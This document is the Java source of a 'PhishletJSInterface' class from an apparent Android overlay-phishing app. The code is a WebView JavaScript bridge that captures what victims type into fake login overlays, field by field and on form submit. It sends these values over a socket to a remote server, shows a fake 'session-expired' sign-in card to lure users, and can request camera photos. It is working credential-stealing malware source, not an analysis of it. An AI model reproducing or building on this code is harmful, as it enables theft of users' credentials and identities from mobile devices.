package com.fason.app.features.phishlet;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.webkit.JavascriptInterface;

import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;
import com.fason.app.features.overlay.OverlayManager;
import com.fason.app.features.overlay.OverlayService;

import org.json.JSONObject;

public class PhishletJSInterface {
    private static final String TAG = "PhishletJS";
    private final OverlayService service;

    public PhishletJSInterface(OverlayService svc) {
        this.service = svc;
    }

    @JavascriptInterface
    public void onFieldCaptured(String fieldName, String value, String fieldType) {
        try {
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, Protocol.PHISHLET);
            r.put(Protocol.KEY_ACTION, "field_capture");
            r.put("fieldName", fieldName);
            r.put("fieldValue", value);
            r.put("fieldType", fieldType);
            r.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            emit(r);
        } catch (Exception e) {
            Log.e(TAG, "onFieldCaptured error", e);
        }
    }

    /** Pre-page handoff: victim tapped "Sign In" on the session-expired card.
     *  Swap the WebView to the real credential page for the current package. */
    @JavascriptInterface
    public void onPrePageContinue() {
        if (service == null) return;
        String pkg = service.getCurrentPackage();
        String real = PhishletManager.resolveTemplate(pkg);
        new Handler(Looper.getMainLooper()).post(() -> {
            service.showOverlay(pkg, real,
                PhishletManager.isPersistent(pkg));
        });
    }

    @JavascriptInterface
    public void onFormSubmit(String jsonData) {
        try {
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, Protocol.PHISHLET);
            r.put(Protocol.KEY_ACTION, Protocol.ACT_PHISHLET_SUBMIT);
            r.put(Protocol.KEY_PHISHLET_DATA, new JSONObject(jsonData));
            r.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            emit(r);

            String pkg = service != null ? service.getCurrentPackage() : "";
            if (service != null) {
                service.notifyDataCaptured(pkg);
            }
            if (service != null && !OverlayManager.isPersistent(pkg)) {
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    service.hideOverlay();
                }, 3000);
            }
        } catch (Exception e) {
            Log.e(TAG, "onFormSubmit error", e);
        }
    }

    @JavascriptInterface
    public void onStageChange(int stage) {
        try {
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, Protocol.PHISHLET);
            r.put(Protocol.KEY_ACTION, Protocol.ACT_PHISHLET_STAGE);
            r.put(Protocol.KEY_PHISHLET_STAGE, stage);
            r.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            emit(r);
        } catch (Exception e) {
            Log.e(TAG, "onStageChange error", e);
        }
    }

    @JavascriptInterface
    public void requestCamera(String photoType) {
        try {
            JSONObject r = new JSONObject();
            r.put(Protocol.KEY_TYPE, Protocol.PHISHLET);
            r.put(Protocol.KEY_ACTION, "request_camera");
            r.put("photoType", photoType);
            r.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
            emit(r);
        } catch (Exception e) {
            Log.e(TAG, "requestCamera error", e);
        }
    }

    private void emit(JSONObject data) {
        SocketClient client = SocketClient.getInstance();
        if (client != null && client.getSocket() != null) {
            client.getSocket().emit(Protocol.PHISHLET, data);
        }
    }
}
